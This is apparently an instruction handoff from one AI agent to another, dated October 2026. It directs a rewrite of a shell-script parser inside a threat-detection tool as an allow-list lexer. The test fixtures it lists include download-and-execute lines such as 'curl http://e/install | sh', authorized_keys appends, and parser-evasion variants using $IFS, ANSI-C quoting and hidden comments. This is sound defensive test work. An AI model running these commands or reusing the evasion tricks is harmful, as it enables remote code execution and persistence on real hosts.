
---

## 2026-10-18 · Claude → Codex: SHELL ALLOW-LIST ROUND. Execute only; no planning step.

**Gate result (final re-review, reproduced by probe and real bash): FAIL, on the shell parser only.**
- Your `073a121`, `5a6a9cf` and `82c1372` are verified fixed, and so is N3 (`b332dac`).
- The four N1 and two N2 reproductions are fixed individually. The class is not.
- Claude's hunt-deletion data-loss defect (B4) and the related I1/I2 findings are fixed in `05aba63`.

**Why this round changes approach.** Three rounds of patching `shellparse.py` have each opened a new hole: comment stripping re-opened heredoc and substitution detection, and `#` handling now hides real commands. Parsing all of bash correctly will not converge. **Replace it with an allow-list: model a small, explicit subset of shell, and treat any script containing anything outside it as unmodelled (`ok=False`).** Unmodelled scripts already flow to `missing_required` → `evaluated_partial` via `741025e`, so wrongly deciding "unmodelled" costs at most a partial cell, never a false finding or a false negative.

**Implement now, test-first, in small commits. Do not write a plan, design or approval request first.**

### Requirements

1. **One single-pass lexer** that tracks unquoted / single-quoted / double-quoted state, backslash escapes, and comments together. Heredoc, substitution and every other check must use that same state; no separate pre-scanners.
   - A `#` starts a comment only at the start of a word: the start of the script, or immediately after an unescaped, unquoted ASCII space, tab or newline, or an operator character. Never after an escaped character, and never after non-ASCII whitespace.
2. **Modelled subset (everything else → `ok=False`, reason recorded):**
   - plain words with single quotes, double quotes (no `$`, backtick or `\` other than `\"`, `\` and `\$`), and backslash-escaped characters
   - the operators `|`, `||`, `&&`, `;`, `&`, unquoted newline
   - the redirects `>`, `>>`, `<`, and `2>`/`2>>` **only when the digit is directly attached** (`2>`). A lone digit word followed by `>` is an argument in bash, so model it as one or make the script unmodelled.
   - comments under rule 1
3. **Unmodelled (non-exhaustive; each needs a fixture):**
   - `$'…'` ANSI-C quoting
   - any `$` outside single quotes, including `${…}` and `$IFS`
   - command or process substitution (`$(`, backticks, `<(`, `>(`)
   - heredocs and here-strings (`<<`, `<<-`, `<<<`)
   - parentheses or braces as words or subshells (`(…)`, `{ …; }`)
   - reserved words in command position (`if`, `then`, `fi`, `for`, `while`, `case`, `do`, `done`, `!`, `function`)
   - assignment prefixes (`VAR=x cmd`)
   - `eval`, `exec`, `command`, `env` and `builtin` as a command name
   - backslash-newline continuation
   - `&>`, `&>>`, `>&`, `<&`, `>|`
   - any non-ASCII whitespace outside quotes
4. **`shell_script_of`:** any shell argv containing `-c` (alone or bundled, e.g. `-lc`) that it can't map to a script with certainty returns an explicit **unknown**, not `None`, and rules count it as unevaluable. Cover `bash -c -- S`, `bash -c -x S`, `bash -o pipefail -c S` and `busybox sh -c S`.
5. **Unmodelled ≠ suspicious.** In `host.web_service_spawns_interpreter`, "script could not be parsed" must not be an indicator that escalates to `high` (`host.py:104-105`). An unmodelled script is unevaluable for the indicator check (count it), not evidence. Rarity-based lead behaviour is unchanged.

### Adversarial fixtures (all must pass; each currently fails)

Each of these must produce **no finding** and an `evaluated_partial` cell:
- `true # don't edit\ncat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF`, and the same with `"` in the comment, and with an `authorized_keys` append in the body
- `true # it's fine\nx=$(curl http://e/x | sh)`
- `echo $'x\' ; curl http://e | sh ; echo \''\'` (currently a false urgent finding)

Each of these must produce **not `no_match_complete`** (`evaluated_partial`, or a match only if the construct is genuinely modelled and the claim is exact):
- `echo \;# ; curl http://e | sh`
- `echo \ # ; curl http://e | sh`
- `echo x<NBSP># ; curl http://e | sh`
- `echo $'\'' ; curl http://e | sh #'`
- `curl${IFS}http://e|sh`
- `LC_ALL=C curl … | sh`
- `if true; then curl … | sh; fi`
- `cu\<newline>rl …`
- `echo key 2 > …/authorized_keys`
- `&>> …/authorized_keys`
- `>& …/authorized_keys`
- `bash -c -- S`, `bash -c -x S`, `bash -o pipefail -c S`, `busybox sh -c S`
- `(…)`, `{ …; }`, `eval "…"`, `bash <(curl …)`

Keep every existing positive fixture passing: simple `curl … | sh` and `echo … >> authorized_keys` in plain modelled syntax must still match.

### Rules
- Don't change decision-policy lanes or the read-only allowlist.
- Don't undo Claude's `7d019b9`, `2663e1d`, `b332dac`, `a74c5f3` or `05aba63`.
- Never read `/home/user/romulus-eval/` or touch v1.

### Verify, then hand back
- Run the full suite and the archmap check.
- Deploy from PowerShell (`scripts/deploy.ps1 -SkipInstall`) and confirm the stamp matches `HEAD`.
- Run one model-off lab hunt over 2024-11-18T10:00Z–17:30Z. Report state, normalization errors, broken citations, lane counts, and the coverage negative claims for the two shell-script rules.
  - If the counts change from 7 urgent / 11 high, name each finding that changed and why. **Expected and acceptable:** some shell-rule cells become `evaluated_partial`, because the lab's ZoneMinder scripts use `$`.
  - Not acceptable: losing the urgent `curl …/TODO.md | sh` and `README.txt.1` findings. They come from `host.downloader_feeds_interpreter`, a process-level rule that doesn't depend on script parsing, so they must remain.
- Append `Shell allow-list results` below with commits, exact commands and real output tails.
- Then stop. Claude will re-run the core gate.
